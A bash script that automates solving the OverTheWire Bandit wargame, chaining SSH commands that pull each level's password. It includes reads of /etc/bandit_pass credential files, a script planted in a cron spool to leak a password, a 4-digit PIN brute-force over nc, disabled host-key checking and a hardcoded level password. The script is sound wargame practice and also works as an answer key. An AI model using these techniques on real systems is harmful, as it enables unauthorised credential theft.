#! /usr/bin/env bash

# This script pulls the passwords for each bandit level

TMP_SSH_CONF=$(mktemp tmp.XXXXXX)    # tmp config
HOST_PT="@127.0.0.1 -p 4242"         # host and port
SSH_LGN="ssh -F ${TMP_SSH_CONF}"     # ssh flag and tmp config
LVL_0_PASS="bandit0"                 # level 1 password, it's on the website
USR_NUM=0                            # the user number, it starts with bandit0 
USE_PASS_NUM=0                       # the password number we use, it will always be 1 behind the one we set
SET_PASS_NUM=1                       # the password for the next level we are setting
NEXT_PASS_NUM=1                      # number for the next password level
LOCAL_PORT=4242                      # the port we connect to on the localhost
KEY_OR_PASS="PASS"                   # there is a level with an sshkey, throws a function off
TOGGLE_PASS="ON"                     # Another switch for handling key/password logic
################################################################     
 ####  This function is what runs through each level. We reverse port forward ssh from the bandit server and 
  ##   generate a custom ssh config to use, then connect over the localhost on port 4242 (can be any). The    
  ##   eval in the function allows us to set a variable inside a variable name. Each time the function is called
  ##   the password/level and user numbers are incremented to match the next level. We simply pass the command
  ##   we want to run through ssh to the function and it adds it to the eval statement. Making certain everything
  ##   was properly escaped was a pain. We then print out the info & increment, as mentioned before.
 ####
################################################################

crack_level(){
    
    if [[ ${TOGGLE_PASS} == "ON" ]]; then
        eval "LVL_${SET_PASS_NUM}_PASS=\$(sshpass -p \"\${LVL_${USE_PASS_NUM}_PASS}\" \${SSH_LGN} bandit${USR_NUM}\${HOST_PT} \"\${@}\" 2>/dev/null)"
    elif [[ ${TOGGLE_PASS} == "OFF" ]]; then
        sed -i 's/password/publickey/' ${TMP_SSH_CONF}
        ((USE_PASS_NUM--))
         eval "LVL_${SET_PASS_NUM}_PASS=\$(\${SSH_LGN} -i level_\${USE_PASS_NUM}.key bandit\${USR_NUM}\${HOST_PT} \"\${@}\" 2>/dev/null)"; 
        sed -i 's/publickey/password/' ${TMP_SSH_CONF}
#        printf "\n[ OK ] -- Password for level ${SET_PASS_NUM} obtained\n"
#        eval "printf \"          { \"\${LVL_${SET_PASS_NUM}_PASS}\" }\n\""
        eval "TEMP_PASS=$(echo \"\${LVL_${SET_PASS_NUM}_PASS}\")"
        ((USE_PASS_NUM++))
    else echo "shoot."; exit 1 # This should never happen
    fi

    if [[ ${KEY_OR_PASS} == "PASS" ]]; then 
        printf "[ OK ] -- Password for level ${SET_PASS_NUM} obtained\n"
        eval "printf \"          { \"\${LVL_${SET_PASS_NUM}_PASS}\" }\n\""
        ((USR_NUM++)); ((USE_PASS_NUM++)); ((SET_PASS_NUM++)); ((NEXT_PASS_NUM++))
    elif [[ ${KEY_OR_PASS} == "KEY" ]]; then
        eval "KEY_VAR=\$(echo \"\${LVL_${SET_PASS_NUM}_PASS}\")" # I hate eval.
        [[ -f level_${USE_PASS_NUM}.key ]] && rm -f level_${USE_PASS_NUM}.key 2>/dev/null
        echo ${KEY_VAR} | base64 --decode > level_${USE_PASS_NUM}.key
        chmod 400 level_${USE_PASS_NUM}.key
        printf "[ OK ] -- Key for level ${SET_PASS_NUM} obtained\n"
        printf "          { saved to file level_${SET_PASS_NUM}.key }\n"
        ((USR_NUM++)); ((USE_PASS_NUM++)); ((SET_PASS_NUM++)); ((NEXT_PASS_NUM++))
    else echo "crap."; exit 1 # This should never happen
    fi
    
}

clean_up(){ 
    [[ ! -z ${REV_PORT_FWD} ]] && kill ${REV_PORT_FWD} 2>/dev/null
    rm -f ${TMP_SSH_CONF} 2>/dev/null
    exit
}    

trap clean_up SIGINT INT TERM EXIT

################################################################     
  ## This is the ssh config mentioned previously
################################################################

cat <<EOF>> ${TMP_SSH_CONF}           
Host *
    ForwardAgent no
    ProxyCommand none
    ControlPath none
    GSSAPIAuthentication no
    StrictHostKeyChecking no
    VerifyHostKeyDNS no
    TCPKeepAlive yes
    PreferredAuthentications password
EOF

################################################################     
  ## This is where we set up the reverse port forward to our local host on the given port
################################################################

sshpass -p "bandit0" ssh -N -T -L ${LOCAL_PORT}:127.0.0.1:22 \
    bandit0@bandit.labs.overthewire.org -p 2220 2>/dev/null &
REV_PORT_FWD=$!

until nc 127.0.0.1 ${LOCAL_PORT} >/dev/null 2>/dev/null </dev/null; do 
    sleep 1
done

################################################################     
  ## Here we just call { crack_level '<command to retrieve password>' }
################################################################

crack_level 'cat readme'
crack_level 'find . -not -path '*/\.*' -type f -exec cat {} \;'
crack_level 'find . -not -path '*/\.*' -type f -exec cat {} \;'
crack_level 'cat inhere/.hidden'
crack_level "file inhere/-file0* | awk -F: '/ASCII/ {gsub(/\:.*/,\"\"); print}' | xargs cat"
crack_level 'find . -type f -size 1033c -exec egrep "\w+" {} \;'
crack_level 'find / -user bandit7 -group bandit6 -size 33c 2>/dev/null | xargs cat'
crack_level "awk '/millionth/ {print \$NF}' data.txt"
crack_level 'sort data.txt  | uniq -u'
crack_level "strings data.txt | egrep \"^===.*\w+{10,}\" | cut -d' ' -f2"
crack_level "cat data.txt | base64 -d | rev| cut -d' ' -f1 | rev"
crack_level "cat data.txt | tr a-zA-Z n-za-mN-ZA-M | rev |  cut -d' ' -f1 | rev"
crack_level "xxd -r data.txt | gunzip -c | bzip2 -d | gunzip -c | tar -x -O | tar -x -O \
             | bzip2 -d | tar -x -O | gunzip -c | rev |  cut -d' ' -f1 | rev"
KEY_OR_PASS="KEY"
crack_level 'cat sshkey.private | base64 -w0'
TOGGLE_PASS="OFF"
KEY_OR_PASS="PASS"
crack_level "cat /etc/bandit_pass/bandit14 | nc localhost 30000 | egrep \"\w+{10,}\""
TOGGLE_PASS="ON"
crack_level "echo ${TEMP_PASS} | openssl s_client -connect localhost:30001 \
            -ign_eof 2>/dev/null | sed -n '/Correct!/{n;p;}'"
KEY_OR_PASS="KEY"
crack_level "nmap localhost -p 31000-32000 | awk -F/ '/open/ {print \$1}' \
            | xargs -I {} bash -c \"echo cluFn7wTiGryunymYOu4RcffSxQluehd | timeout 3 openssl s_client -quiet -connect localhost:{} -ign_eof 2>&1 2>/dev/null | sed -n '/-----BE/,/-----EN/p'\" | base64 -w0"
TOGGLE_PASS="OFF"
KEY_OR_PASS="PASS"
crack_level "diff -i -y -w --suppress-common-lines passwords.new passwords.old \
            | cut -d'|' -f1 | tr -d '[[:space:]]'"
TOGGLE_PASS="ON"
crack_level "cat readme"
crack_level "./bandit20-do cat /etc/bandit_pass/bandit20"
# I'll need to add in the variable for the pass here... will just set it to a different variable
# so i don't have to use eval again
TEMP_PASS=$(eval echo \"\${LVL_${USE_PASS_NUM}_PASS}\")
crack_level "((while true; do ./suconnect 4242 2>/dev/null; sleep 1; done) & WHILE_PID=\$!; echo ${TEMP_PASS} | nc -lp 4242; sleep 2; kill \${WHILE_PID}) | sed 's/Read:.*//;s/^Password.*//g' | egrep '\w+'"
crack_level "cat \$(cat /usr/bin/cronjob_bandit22.sh | tr ' ' '\n' | tail -1)"
crack_level "cat \$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1 | sed 's/\(^\)/\/tmp\/\1/')"
TEMP_FILE="/tmp/bandit23_$(date +%s)"
crack_level "echo -e \"#! /usr/bin/env bash\n/bin/cat /etc/bandit_pass/bandit24 > ${TEMP_FILE}\nchown bandit23:bandit23 ${TEMP_FILE}}\" > /var/spool/bandit24/return_pass && chmod +x /var/spool/bandit24/return_pass; until cat ${TEMP_FILE} 2>&1 | grep -v 'No such'; do sleep 1; done"
TEMP_PASS=$(eval echo \"\${LVL_${USE_PASS_NUM}_PASS}\")
crack_level "unset pass_array; for number in {0000..9999}; do pass_array+=(\"${TEMP_PASS} \${number}\\n\"); done; echo -e \${pass_array[@]} | cat |nc localhost 30002 | sed -n '/The password/{s/^.* //p}'"

exit
